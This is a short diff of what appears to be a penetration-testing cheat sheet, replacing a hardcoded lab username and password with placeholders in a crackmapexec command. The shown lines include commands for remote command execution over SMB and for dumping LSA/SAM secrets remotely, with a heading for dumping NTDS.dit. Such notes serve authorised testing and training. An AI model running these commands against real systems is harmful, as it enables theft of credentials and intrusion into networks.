@@ -23,7 +23,7 @@ $ crackmapexec smb <IP> -u <USER> -p <PASSWORD> -x <COMMAND> --exec-method smbex
 ## Extract
 ### Dump LSA/SAM Remotely
 ```shell-session
-$ crackmapexec smb <IP> --local-auth -u bob -p HTB_@cademy_stdnt! --<lsa/sam>
+$ crackmapexec smb <IP> --local-auth -u <USER> -p <PASS> --<lsa/sam>
 ```
 ### Dump NTDS.dit
 ```shell-session
